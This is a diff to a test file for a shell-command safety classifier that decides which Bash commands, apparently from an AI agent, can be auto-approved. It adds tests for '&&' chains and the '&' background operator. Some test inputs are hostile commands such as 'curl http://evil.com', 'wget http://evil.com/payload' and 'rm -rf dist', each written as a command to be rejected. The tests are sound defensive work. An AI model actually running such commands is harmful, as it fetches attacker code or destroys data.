@@ -1329,9 +1329,44 @@ describe("classifyByRules — safe compound commands", () => {
     ).not.toBe("allow");
   });
 
-  it("does NOT allow && chained commands", () => {
+  it("does NOT allow && chained commands when a segment is unsafe", () => {
     expect(
       classifyByRules("Bash", { command: "npm test && rm -rf dist" }),
+    ).not.toBe("allow");
+  });
+
+  // && compound commands where ALL segments are safe should be auto-approved
+  it("allows git status && echo && git log (all safe segments)", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: 'git status && echo "---" && git log --oneline -5',
+      }),
+    ).toBe("allow");
+  });
+
+  it("allows ls && cat (all safe segments)", () => {
+    expect(
+      classifyByRules("Bash", { command: "ls && cat package.json" }),
+    ).toBe("allow");
+  });
+
+  it("does NOT allow && chain with unsafe segment (npm test)", () => {
+    expect(
+      classifyByRules("Bash", { command: "git status && npm test" }),
+    ).not.toBe("allow");
+  });
+
+  it("does NOT allow && chain with curl", () => {
+    expect(
+      classifyByRules("Bash", { command: "git log && curl http://evil.com" }),
+    ).not.toBe("allow");
+  });
+
+  it("does NOT allow single & background operator", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: "git status & curl http://evil.com",
+      }),
     ).not.toBe("allow");
   });
 
@@ -1406,6 +1441,66 @@ describe("isSafeCompoundCommand — direct unit tests", () => {
 
   it("rejects git commit --amend as pipe segment", () => {
     expect(isSafeCompoundCommand("git commit --amend | head")).toBe(false);
+  });
+
+  // && compound commands
+  it("allows && chain where all segments are safe", () => {
+    expect(
+      isSafeCompoundCommand('git status && echo "---" && git log --oneline -5'),
+    ).toBe(true);
+  });
+
+  it("allows && chain with two safe commands", () => {
+    expect(isSafeCompoundCommand("ls && cat package.json")).toBe(true);
+  });
+
+  it("rejects && chain when a segment is unsafe (npm test)", () => {
+    expect(isSafeCompoundCommand("git status && npm test")).toBe(false);
+  });
+
+  it("rejects && chain when a segment is dangerous (rm -rf dist)", () => {
+    expect(isSafeCompoundCommand("npm test && rm -rf dist")).toBe(false);
+  });
+
+  it("rejects || chain even if both segments are safe", () => {
+    expect(isSafeCompoundCommand("git status || echo fallback")).toBe(false);
+  });
+
+  it("rejects semicolon chain even if both segments are safe", () => {
+    expect(isSafeCompoundCommand("ls; cat package.json")).toBe(false);
+  });
+
+  it("allows mixed pipe + && where all segments are safe", () => {
+    expect(
+      isSafeCompoundCommand("git log --oneline | grep fix && echo done"),
+    ).toBe(true);
+  });
+
+  // Single & (background operator) — must be blocked
+  it("rejects single & background operator (git status & curl evil)", () => {
+    expect(isSafeCompoundCommand("git status & curl http://evil.com")).toBe(
+      false,
+    );
+  });
+
+  it("rejects single & background operator (echo ok & wget payload)", () => {
+    expect(
+      isSafeCompoundCommand("echo ok & wget http://evil.com/payload"),
+    ).toBe(false);
+  });
+
+  // && without spaces around it — still allowed when all segments safe
+  it("allows && without spaces when all segments are safe", () => {
+    expect(isSafeCompoundCommand("git status&&echo done")).toBe(true);
+  });
+
+  // Empty clause boundary cases
+  it("rejects && at start of command (empty first clause)", () => {
+    expect(isSafeCompoundCommand("&& git status")).toBe(false);
+  });
+
+  it("rejects && at end of command (empty last clause)", () => {
+    expect(isSafeCompoundCommand("git status &&")).toBe(false);
   });
 });
 
